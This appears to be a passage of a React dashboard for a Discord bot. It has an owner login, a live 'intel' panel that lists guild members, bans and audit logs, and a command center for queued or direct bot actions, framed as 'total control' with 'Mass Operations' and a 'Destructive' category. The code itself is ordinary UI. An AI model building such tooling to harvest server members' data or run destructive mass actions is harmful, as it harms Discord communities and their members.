          {isPending ? (cmd.direct ? "Executing…" : "Sending…") : cmd.direct ? "⚡ Execute Now" : "Execute"}
        </button>
      </form>
      {state && state.status !== "idle" && (
        <div className={`ctrl-result${isDone ? " ok" : ""}${isFailed ? " fail" : ""}${isPending ? " pending" : ""}${isTimeout ? " timeout" : ""}`}>
          <span>
            {isPending
              ? `⏳ Queued — waiting for bot…`
              : isTimeout
              ? `⚠ Bot didn't respond (check if bot is online)`
              : isDone
              ? `✓ ${state.result || "Done"}`
              : `✗ ${state.result || "Failed"}`}
          </span>
          {state.ts && !isPending && (
            <time>{new Date(state.ts).toLocaleTimeString()}</time>
          )}
        </div>
      )}
    </div>
  );
}

// ─── IntelPanel component (live Discord data) ─────────────────────────────────

type IntelGuild = { id: string; name: string; icon?: string };

function IntelPanel({ authenticated }: { authenticated: boolean }) {
  const [guilds, setGuilds] = useState<IntelGuild[]>([]);
  const [guildsLoaded, setGuildsLoaded] = useState(false);
  const [selectedGuild, setSelectedGuild] = useState("");
  const [intelTab, setIntelTab] = useState<"guilds" | "channels" | "roles" | "members" | "bans" | "audit">("guilds");
  const [loading, setLoading] = useState(false);
  const [intelData, setIntelData] = useState<string[]>([]);
  const [guildInputId, setGuildInputId] = useState("");
  const [activeGuildId, setActiveGuildId] = useState("");

  const execDirect = useCallback(async (action: string, params: Record<string, unknown>) => {
    setLoading(true);
    setIntelData([]);
    try {
      const r = await fetch("/api/discord-exec", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ action, params }) });
      const d = await r.json();
      if (d.ok) {
        const lines = String(d.result).split("\n").filter(Boolean);
        setIntelData(lines);
      } else {
        setIntelData([`Error: ${d.result ?? d.error}`]);
      }
    } catch (e) {
      setIntelData([`Network error: ${e}`]);
    }
    setLoading(false);
  }, []);

  useEffect(() => {
    if (!authenticated || guildsLoaded) return;
    setGuildsLoaded(true);
    fetch("/api/discord-exec", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ action: "get_guilds", params: {} }) })
      .then((r) => r.json())
      .then((d) => {
        if (d.ok) {
          const lines = String(d.result).split("\n").filter(Boolean);
          setGuilds(lines.map((l) => {
            const m = l.match(/^(.+?) \((\d+)\)$/);
            return m ? { id: m[2], name: m[1] } : { id: "?", name: l };
          }));
        }
      })
      .catch(() => undefined);
  }, [authenticated, guildsLoaded]);

  const fetchIntel = useCallback((tab: typeof intelTab, gid: string) => {
    if (!gid) return;
    setActiveGuildId(gid);
    setIntelTab(tab);
    const actionMap: Record<typeof intelTab, string> = {
      guilds: "get_guilds", channels: "get_channels", roles: "get_roles",
      members: "get_members", bans: "list_bans", audit: "guild_audit",
    };
    execDirect(actionMap[tab], { guild_id: gid, limit: 50 });
  }, [execDirect]);

  const guildId = selectedGuild || guildInputId;
  const INTEL_TABS: { id: typeof intelTab; label: string; emoji: string }[] = [
    { id: "guilds", label: "All Guilds", emoji: "🏰" },
    { id: "channels", label: "Channels", emoji: "💬" },
    { id: "roles", label: "Roles", emoji: "🎭" },
    { id: "members", label: "Members", emoji: "👥" },
    { id: "bans", label: "Ban List", emoji: "🔨" },
    { id: "audit", label: "Audit Log", emoji: "📋" },
  ];

  return (
    <div style={{ marginTop: 20 }}>
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: 20 }}>
        <div>
          <p className="section-label">LIVE INTELLIGENCE</p>
          <h2 style={{ font: "400 28px Georgia, serif", margin: "6px 0 4px", color: "var(--lavender)" }}>Discord live data</h2>
          <p style={{ color: "var(--muted)", fontSize: 11 }}>Real-time data pulled directly from the Discord API using the bot token.</p>
        </div>
        <span className="live-status online"><b />API Connected</span>
      </div>

      {/* Guild selector */}
      <div style={{ display: "flex", gap: 10, marginBottom: 16, flexWrap: "wrap" }}>
        {guilds.slice(0, 8).map((g) => (
          <button key={g.id} onClick={() => setSelectedGuild(g.id)}
            style={{ border: `1px solid ${selectedGuild === g.id ? "var(--violet)" : "var(--line2)"}`, borderRadius: 8, padding: "6px 12px", background: selectedGuild === g.id ? "rgba(124,58,237,.2)" : "transparent", color: selectedGuild === g.id ? "var(--violet3)" : "var(--muted)", cursor: "pointer", fontSize: 10, transition: "all .15s" }}>
            {g.name.length > 18 ? g.name.slice(0, 16) + "…" : g.name}
          </button>
        ))}
        <input value={guildInputId} onChange={(e) => setGuildInputId(e.target.value)} placeholder="Or paste Guild ID…"
          style={{ flex: 1, minWidth: 180, border: "1px solid var(--line2)", borderRadius: 8, background: "rgba(9,1,26,.8)", color: "var(--ink)", padding: "6px 10px", fontSize: 10, outline: "none" }} />
      </div>

      {/* Intel category tabs */}
      <div style={{ display: "flex", gap: 6, flexWrap: "wrap", marginBottom: 16 }}>
        {INTEL_TABS.map((t) => (
          <button key={t.id} onClick={() => t.id === "guilds" ? execDirect("get_guilds", {}) : fetchIntel(t.id, guildId)}
            style={{ border: `1px solid ${intelTab === t.id ? "var(--violet)" : "var(--line2)"}`, borderRadius: 7, padding: "7px 13px", background: intelTab === t.id ? "rgba(124,58,237,.18)" : "transparent", color: intelTab === t.id ? "var(--violet3)" : "var(--muted)", cursor: "pointer", fontSize: 9, letterSpacing: ".08em", transition: "all .15s", display: "flex", alignItems: "center", gap: 5 }}>
            {t.emoji} {t.label}
          </button>
        ))}
      </div>

      {/* Intel result panel */}
      <div style={{ border: "1px solid var(--line2)", borderRadius: 14, background: "linear-gradient(145deg, var(--panel2), var(--shadow))", overflow: "hidden" }}>
        <div style={{ padding: "12px 16px", borderBottom: "1px solid var(--line2)", display: "flex", justifyContent: "space-between", alignItems: "center", background: "rgba(9,1,26,.6)" }}>
          <span style={{ fontSize: 9, letterSpacing: ".14em", color: "var(--muted)", textTransform: "uppercase" }}>
            {loading ? "⏳ Loading…" : `${intelData.length} results${activeGuildId ? ` — Guild: ${activeGuildId}` : ""}`}
          </span>
          {activeGuildId && !loading && (
            <div style={{ display: "flex", gap: 6 }}>
              {(["channels", "roles", "members", "bans", "audit"] as const).map((t) => (
                <button key={t} onClick={() => fetchIntel(t, activeGuildId || guildId)}
                  style={{ border: "1px solid var(--line2)", borderRadius: 5, background: intelTab === t ? "rgba(124,58,237,.15)" : "transparent", color: intelTab === t ? "var(--violet3)" : "var(--muted)", padding: "3px 8px", fontSize: 8, cursor: "pointer", letterSpacing: ".08em" }}>
                  {t}
                </button>
              ))}
            </div>
          )}
        </div>
        <div style={{ maxHeight: 400, overflow: "auto", padding: intelData.length ? 0 : 24 }}>
          {intelData.length === 0 ? (
            <div className="intel-empty">
              {loading ? "Fetching live data from Discord…" : "Select a guild and a category above to load live data."}
            </div>
          ) : (
            intelData.map((line, i) => (
              <div key={i} className="intel-row">
                <span className="iname">{line.split("(")[0].trim()}</span>
                {line.includes("(") && <span className="iid">{line.match(/\(([^)]+)\)/)?.[1]}</span>}
                {line.includes("—") && <span className="ibadge">{line.split("—")[1]?.trim().slice(0, 22)}</span>}
              </div>
            ))
          )}
        </div>
      </div>
    </div>
  );
}

// ─── Main ─────────────────────────────────────────────────────────────────────

export default function Home() {
  const [botStatus, setBotStatus] = useState<{ connected: boolean; username?: string; avatarUrl?: string | null } | null>(null);
  const [ownerAuth, setOwnerAuth] = useState<{ authenticated: boolean; user?: { id: string; name: string } } | null>(null);
  const [botEvents, setBotEvents] = useState<BotEvent[]>([]);
  const [eventConnected, setEventConnected] = useState(false);
  const [botMetrics, setBotMetrics] = useState<BotMetrics | null>(null);

  const [category, setCategory] = useState("All");
  const [query, setQuery] = useState("");
  const [eventFilter, setEventFilter] = useState<"all" | "info" | "warn" | "error">("all");
  const [eventQuery, setEventQuery] = useState("");
  const [ownerTab, setOwnerTab] = useState<"overview" | "control" | "intel">("overview");
  const [ctrlCategory, setCtrlCategory] = useState(CTRL_CATEGORIES[0].id);
  const [cmdStates, setCmdStates] = useState<Record<string, CmdState>>({});
  const pendingIds = useRef<Map<string, string>>(new Map());

  // ── Tick for timeout detection ───────────────────────────────────────────
  const [tick, setTick] = useState(0);
  useEffect(() => {
    const t = setInterval(() => setTick((n) => n + 1), 5000);
    return () => clearInterval(t);
  }, []);

  // Upgrade any pending states that have timed out
  useEffect(() => {
    const now = Date.now();
    setCmdStates((prev) => {
      let changed = false;
      const next = { ...prev };
      for (const [k, v] of Object.entries(next)) {
        if (v.status === "pending" && (now - new Date(v.ts).getTime()) > TIMEOUT_MS) {
          next[k] = { ...v, status: "timeout", result: "Bot did not respond — check if online" };
          changed = true;
        }
      }
      return changed ? next : prev;
    });
  }, [tick]);

  // ── Data fetching ─────────────────────────────────────────────────────────
  useEffect(() => {
    const refresh = () => fetch("/api/bot-status").then((r) => r.json()).then(setBotStatus).catch(() => undefined);
    refresh();
    const t = setInterval(refresh, 15_000);
    return () => clearInterval(t);
  }, []);

  useEffect(() => {
    fetch("/api/auth/me").then((r) => r.json()).then(setOwnerAuth).catch(() => setOwnerAuth({ authenticated: false }));
  }, []);

  useEffect(() => {
    if (!ownerAuth?.authenticated) return;
    const refresh = () =>
      fetch("/api/bot-events", { cache: "no-store" })
        .then((r) => (r.ok ? r.json() : null))
        .then((d) => { if (!d) return; setBotEvents(d.events ?? []); setEventConnected(Boolean(d.connected)); setBotMetrics(d.metrics ?? null); })
        .catch(() => undefined);
    refresh();
    const t = setInterval(refresh, 3_000);
    return () => clearInterval(t);
  }, [ownerAuth?.authenticated]);

  // Poll bot-queue action results
  useEffect(() => {
    if (!ownerAuth?.authenticated) return;
    const refresh = () =>
      fetch("/api/owner-actions")
        .then((r) => (r.ok ? r.json() : null))
        .then((d: { history?: ActionHistory[] } | null) => {
          if (!d?.history) return;
          setCmdStates((prev) => {
            const next = { ...prev };
            for (const item of d.history!) {
              const tracked = [...pendingIds.current.entries()].find(([id, act]) => id === item.id && act === item.action);
              if (!tracked) continue;
              if (item.status === "done" || item.status === "failed") {
                next[item.action] = { status: item.status, result: item.result ?? "", ts: item.completedAt ?? new Date().toISOString() };
                pendingIds.current.delete(item.id);
              }
            }
            return next;
          });
        })
        .catch(() => undefined);
    refresh();
    const t = setInterval(refresh, 2_000);
    return () => clearInterval(t);
  }, [ownerAuth?.authenticated]);

  // ── Handlers ─────────────────────────────────────────────────────────────
  const handleLogout = useCallback(async () => {
    await fetch("/api/auth/logout", { method: "POST" });
    setOwnerAuth({ authenticated: false });
  }, []);

  const submitCommand = useCallback(async (action: string, params: Record<string, string | number>, direct: boolean) => {
    setCmdStates((prev) => ({ ...prev, [action]: { status: "pending", result: "", ts: new Date().toISOString() } }));
    if (direct) {
      // Execute immediately via Discord API
      try {
        const r = await fetch("/api/discord-exec", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ action, params }) });
        const d = await r.json();
        setCmdStates((prev) => ({ ...prev, [action]: { status: d.ok ? "done" : "failed", result: d.result ?? d.error ?? "Unknown error", ts: new Date().toISOString() } }));
      } catch {
        setCmdStates((prev) => ({ ...prev, [action]: { status: "failed", result: "Network error", ts: new Date().toISOString() } }));
      }
    } else {
      // Queue to bot
      try {
        const r = await fetch("/api/owner-actions", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ action, params }) });
        const d = await r.json();
        if (d.id) {
          pendingIds.current.set(d.id, action);
        } else {
          setCmdStates((prev) => ({ ...prev, [action]: { status: "failed", result: d.error ?? "Failed to queue", ts: new Date().toISOString() } }));
        }
      } catch {
        setCmdStates((prev) => ({ ...prev, [action]: { status: "failed", result: "Network error", ts: new Date().toISOString() } }));
      }
    }
  }, []);

  // ── Filters ───────────────────────────────────────────────────────────────
  const filtered = useMemo(() =>
    commands.filter((c) => (category === "All" || c.category === category) && `${c.name} ${c.description}`.toLowerCase().includes(query.toLowerCase())),
    [category, query],
  );
  const filteredEvents = useMemo(() =>
    botEvents.filter((ev) => (eventFilter === "all" || ev.level === eventFilter) && `${ev.message} ${ev.type} ${ev.command ?? ""} ${ev.user ?? ""}`.toLowerCase().includes(eventQuery.toLowerCase())),
    [botEvents, eventFilter, eventQuery],
  );
  const currentCtrlCat = CTRL_CATEGORIES.find((c) => c.id === ctrlCategory) ?? CTRL_CATEGORIES[0];
  const totalCmds = CTRL_CATEGORIES.reduce((s, c) => s + c.cmds.length, 0);

  // ── Render ────────────────────────────────────────────────────────────────
  return (
    <main className="site-main">
      {/* ── Nav ── */}
      <nav className="site-nav">
        <span className="site-brand">✦ ALPHA OMEGA</span>
        <span className="nav-rune">THE END OF ALL FATE</span>
        <div className="nav-status">
          {botStatus?.avatarUrl && <img src={botStatus.avatarUrl} alt="" className="nav-avatar" />}
          <span className={`dot${botStatus?.connected ? " green" : ""}`} />
          <span className="nav-botname">{botStatus?.username ?? "The End Of All Fate"}</span>
        </div>
        <div className="nav-actions">
          {ownerAuth?.authenticated ? (
            <><span className="nav-owner-name">{ownerAuth.user?.name}</span><button className="nav-btn" onClick={handleLogout}>Log out</button></>
          ) : (
            <a className="nav-btn" href="/api/auth/discord">Owner Login</a>
          )}
        </div>
      </nav>

      {/* ── Hero ── */}
      <section className="hero">
        <div className="hero-glyph" />
        <div className="hero-inner">
          <div className="hero-eyebrow">Eminence in Shadow — Private Command Center</div>
          <h1>The End Of All Fate</h1>
          <p className="hero-sub">I operate from the shadows. Every guild, every channel, every member — under total control. Not as a hero. Not as a villain. As the one who pulls all the strings.</p>
          <div className="hero-tags">
            <span>Discord Bot</span>
            <span>Mass Operations</span>
            <span>Real-time Control</span>
            <span>Shadow Protocol</span>
            <span>{totalCmds} Panel Commands</span>
            <span>Direct API Execution</span>
          </div>
        </div>
      </section>

      {/* ── Owner Panel ── */}
      {ownerAuth?.authenticated && (
        <section className="owner-section">
          {/* Profile card */}
          <div className="owner-profile-large">
            <div className="owner-banner">
              <span className="owner-crown">◆ SHADOW MASTER · UNRESTRICTED ACCESS</span>
            </div>
            <div className="owner-body">
              <img
                src={`https://cdn.discordapp.com/avatars/${ownerAuth.user?.id}/avatar.webp?size=256`}
                alt=""
                onError={(e) => { (e.target as HTMLImageElement).src = "https://cdn.discordapp.com/embed/avatars/0.png"; }}
              />
              <div className="owner-main">
                <p className="section-label">AUTHENTICATED OWNER</p>
                <h2>{ownerAuth.user?.name ?? "Shadow Master"}</h2>
                <span>Discord OAuth session active</span>
              </div>
              <div className="owner-id">
                <span>USER ID</span>
                <code>{ownerAuth.user?.id}</code>
              </div>
              <div className="owner-access">
                <span>CLEARANCE</span>
                <b>ABSOLUTE ZERO</b>
              </div>
            </div>
            <div className="owner-stats">
              <div><strong>{botMetrics?.guilds ?? "—"}</strong><span>GUILDS</span></div>
              <div><strong>{botMetrics?.members ?? "—"}</strong><span>MEMBERS</span></div>
              <div><strong>{botMetrics ? `${botMetrics.latencyMs}ms` : "—"}</strong><span>LATENCY</span></div>
              <div><strong>{botMetrics ? `${Math.floor(botMetrics.uptimeSeconds / 3600)}h ${Math.floor((botMetrics.uptimeSeconds % 3600) / 60)}m` : "—"}</strong><span>UPTIME</span></div>
            </div>
          </div>

          {/* Tabs */}
          <div className="owner-tabs">
            <button className={ownerTab === "overview" ? "active" : ""} onClick={() => setOwnerTab("overview")}>
              ◎ Overview
            </button>
            <button className={ownerTab === "intel" ? "active" : ""} onClick={() => setOwnerTab("intel")}>
              🔍 Live Intel
            </button>
            <button className={ownerTab === "control" ? "active" : ""} onClick={() => setOwnerTab("control")}>
              ⚡ Command Center<span className="tab-badge">{totalCmds}</span>
            </button>
          </div>

          {/* ── Overview Tab ── */}
          {ownerTab === "overview" && (
            <>
              <div className="ops-panel">
                <div className="live-bot-heading">
                  <div>
                    <p className="section-label">BOT HEALTH</p>
                    <h2>Live metrics</h2>
                    <p>Heartbeat data streamed directly from the bot every 60 seconds.</p>
                  </div>
                  <span className={botMetrics?.connected ? "live-status online" : "live-status"}>
                    <b />{botMetrics?.connected ? "Heartbeat live" : "Waiting for heartbeat"}
                  </span>
                </div>
                <div className="ops-grid">
                  <div><span>UPTIME</span><strong>{botMetrics ? `${Math.floor(botMetrics.uptimeSeconds / 3600)}h ${Math.floor((botMetrics.uptimeSeconds % 3600) / 60)}m` : "—"}</strong><small>Since last restart</small></div>
                  <div><span>LATENCY</span><strong>{botMetrics ? `${botMetrics.latencyMs} ms` : "—"}</strong><small>Discord gateway</small></div>
                  <div><span>SERVERS</span><strong>{botMetrics?.guilds ?? "—"}</strong><small>Connected guilds</small></div>
                  <div><span>MEMBERS</span><strong>{botMetrics?.members ?? "—"}</strong><small>Across all guilds</small></div>
                  <div><span>CHANNELS</span><strong>{botMetrics?.channels ?? "—"}</strong><small>Visible channels</small></div>
                  <div><span>COMMANDS</span><strong>{botMetrics?.commands ?? "—"}</strong><small>Registered prefix cmds</small></div>
                </div>
                <div className="ops-footer">
                  <span>Last heartbeat {botMetrics?.heartbeatAt ? new Date(botMetrics.heartbeatAt).toLocaleTimeString() : "—"}</span>
                  <span>{botEvents.filter((e) => e.level === "error").length} errors · {botEvents.filter((e) => e.level === "warn").length} warnings in log</span>
                </div>
              </div>

              {/* Action History summary */}
              {Object.values(cmdStates).some((s) => s.status !== "idle") && (
                <div style={{ marginTop: 16, border: "1px solid var(--line2)", borderRadius: 14, background: "linear-gradient(145deg, var(--panel2), var(--shadow))", padding: 20 }}>
                  <p className="section-label">RECENT PANEL ACTIONS</p>
                  <div style={{ display: "flex", flexDirection: "column", gap: 6, marginTop: 10 }}>
                    {Object.entries(cmdStates).filter(([, s]) => s.status !== "idle")
                      .sort((a, b) => new Date(b[1].ts).getTime() - new Date(a[1].ts).getTime())
                      .slice(0, 8)
                      .map(([action, s]) => (
                        <div key={action} className={`ctrl-history-row ${s.status}`}>
                          <code>{action}</code>
                          <span>{s.result?.slice(0, 80) || s.status}</span>
                          <time>{new Date(s.ts).toLocaleTimeString()}</time>
                        </div>
                      ))}
                  </div>
                </div>
              )}

              {/* Event Log */}
              <div className="event-log-panel">
                <div className="event-log-header">
                  <div>
                    <p className="section-label">REAL-TIME BOT LOG</p>
                    <h2>Live activity stream</h2>
                    <p>Actual bot events, refreshed every 3 seconds.</p>
                  </div>
                  <span className={eventConnected ? "live-status online" : "live-status"}>
                    <b />{eventConnected ? "Streaming" : "Waiting for bot"}
                  </span>
                </div>
                <div className="event-log-toolbar">
                  <div className="event-filters">
                    {(["all", "info", "warn", "error"] as const).map((lvl) => (
                      <button key={lvl} className={eventFilter === lvl ? "active" : ""} onClick={() => setEventFilter(lvl)}>
                        {lvl}<span>{lvl === "all" ? botEvents.length : botEvents.filter((e) => e.level === lvl).length}</span>
                      </button>
                    ))}
                  </div>
                  <label className="event-search">
                    <span>⌕</span>
                    <input value={eventQuery} onChange={(e) => setEventQuery(e.target.value)} placeholder="Filter events…" />
                  </label>
                </div>
                <div className="event-log-list">
                  {filteredEvents.length === 0 ? (
                    <div className="event-empty">
                      <span>◎</span>
                      <strong>No events yet</strong>
                      <p>Events appear as the bot operates.</p>
                    </div>
                  ) : (
                    filteredEvents.slice(0, 100).map((ev) => (
                      <div key={ev.id} className={`event-row ${ev.level}`}>
                        <time>{new Date(ev.timestamp).toLocaleTimeString()}</time>
                        <span className="event-level">{ev.level}</span>
                        <div className="event-copy">
                          <strong>{ev.message}</strong>
                          <small>{[ev.command, ev.user, ev.guild, ev.channel].filter(Boolean).join(" · ")}</small>
                        </div>
                      </div>
                    ))
                  )}
                </div>
                <div className="event-log-footer">
                  <span>{filteredEvents.length} events shown</span>
                  <span>Auto-refresh every 3s</span>
                </div>
              </div>
            </>
          )}

          {/* ── Intel Tab ── */}
          {ownerTab === "intel" && <IntelPanel authenticated={ownerAuth.authenticated} />}

          {/* ── Command Center Tab ── */}
          {ownerTab === "control" && (
            <div className="ctrl-panel">
              <div className="ctrl-header">
                <div>
                  <p className="section-label">REMOTE COMMAND CENTER</p>
                  <h2>Live bot control</h2>
                  <p>⚡ INSTANT commands execute via Discord API immediately. Other commands queue for the bot (~5s). Results appear inline.</p>
                </div>
                <span className={botMetrics?.connected ? "live-status online" : "live-status"}>
                  <b />{botMetrics?.connected ? "Bot online" : "Bot offline"}
                </span>
              </div>

              <div className="ctrl-cats">
                {CTRL_CATEGORIES.map((cat) => (
                  <button key={cat.id} className={ctrlCategory === cat.id ? "active" : ""} onClick={() => setCtrlCategory(cat.id)}>
                    {cat.emoji} {cat.label}<span className="cat-count">{cat.cmds.length}</span>
                  </button>
                ))}
              </div>

              <div className="ctrl-grid">
                {currentCtrlCat.cmds.map((cmd) => (
                  <CommandCard key={cmd.id} cmd={cmd} onSubmit={submitCommand} state={cmdStates[cmd.id]} />
                ))}
              </div>

              <div className="ctrl-history">
                <p className="section-label">EXECUTION HISTORY</p>
                {Object.entries(cmdStates).filter(([, s]) => s.status !== "idle").length === 0 ? (
                  <p className="ctrl-history-empty">No commands executed yet this session.</p>
                ) : (
                  <div className="ctrl-history-list">
                    {Object.entries(cmdStates)
                      .filter(([, s]) => s.status !== "idle")
                      .sort((a, b) => new Date(b[1].ts).getTime() - new Date(a[1].ts).getTime())
                      .slice(0, 25)
                      .map(([action, s]) => (
                        <div key={action} className={`ctrl-history-row ${s.status}`}>
                          <code>{action}</code>
                          <span>{s.result?.slice(0, 100) || s.status}</span>
                          <time>{new Date(s.ts).toLocaleTimeString()}</time>
                        </div>
                      ))}
                  </div>
                )}
              </div>
            </div>
          )}
        </section>
      )}

      {/* ── Command Reference ── */}
      <section className="command-section">
        <aside className="command-aside">
          <p className="section-label">CATEGORIES</p>
          {["All", ...Object.keys(groups)].map((cat) => (
            <button key={cat} className={category === cat ? "active" : ""} onClick={() => setCategory(cat)}>
              {cat}
              <span>{cat === "All" ? commands.length : commands.filter((c) => c.category === cat).length}</span>
            </button>
          ))}
        </aside>
        <div className="command-content">
          <div className="command-top">
            <div>
              <p className="section-label">PREFIX COMMANDS</p>
              <h2>{category === "All" ? "Command reference." : `${category} commands`}</h2>
              <small className="catalog-note">Use the <code>!</code> prefix. Destructive operations are restricted to authorized users.</small>
            </div>
            <label className="search">
              <span>⌕</span>
              <input value={query} onChange={(e) => setQuery(e.target.value)} placeholder="Search commands…" />
            </label>
          </div>
          <div className="command-grid">
            {filtered.map((command) => (
              <article className="command-card" key={command.name}>
                <div className="command-title"><code>{command.name}</code></div>
                <p>{command.description}</p>
                <footer>
                  <span className={`pill${command.category === "Destructive" ? " danger" : ""}`}>{command.category}</span>
                  <span>{command.permission}</span>
                </footer>
              </article>
            ))}
          </div>
        </div>
      </section>

      <footer className="site-footer">
        <span className="footer-brand">✦ THE END OF ALL FATE</span>
        <span className="footer-rune">I AM ATOMIC.</span>
        <span>© {new Date().getFullYear()} · Private tools · Controlled access</span>
      </footer>
    </main>
  );
}
